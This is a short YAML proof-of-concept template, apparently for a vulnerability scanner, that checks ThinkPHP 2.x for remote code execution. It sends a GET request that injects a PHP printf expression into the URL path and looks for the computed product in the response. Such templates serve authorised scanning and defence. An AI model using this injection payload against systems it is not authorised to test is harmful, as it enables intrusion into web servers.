name: poc-yaml-thinkphp2x-rce
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
rules:
  - method: GET
    path: /index.php?s=a/b/c/${printf({{r1}}*{{r2}})}/c/d/e/f
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
detail:
  links:
    - author: HWHXY
    - info: THINKPHP 2.x-2.2
    - link: https://www.freebuf.com/column/223149.html
